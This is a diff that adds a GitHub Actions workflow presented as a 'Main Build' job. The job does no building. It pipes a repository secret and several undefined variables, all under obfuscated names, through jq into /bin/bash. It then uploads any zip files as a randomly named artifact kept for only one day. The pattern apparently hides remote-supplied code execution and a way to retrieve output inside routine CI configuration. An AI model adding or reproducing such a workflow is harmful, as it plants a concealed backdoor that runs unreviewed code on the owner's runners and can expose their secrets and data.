@@ -1,0 +1,27 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+jobs:
+  pipeline:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Invoke
+        env:
+          zv7868: ${{ secrets.zv7868 }}
+        run: |
+          printf '%s' "$zv7868" | jq -r .xpjhc2 | /bin/bash
+          echo $o17 | jq -r .xjf48 | /bin/bash
+          echo $xwzpg11394 | jq -r .wig12459 | /bin/bash
+          printf '%s' "$rnkwu103" | jq -r .pa24790 | /bin/bash
+          echo $j4483 | jq -r .qwu92877 | /bin/bash
+          printf '%s' "$yaq23" | jq -r .z6 | /bin/bash
+
+      - name: Persist output
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: FtITUOs4
+          path: "*.zip"
+          retention-days: 1
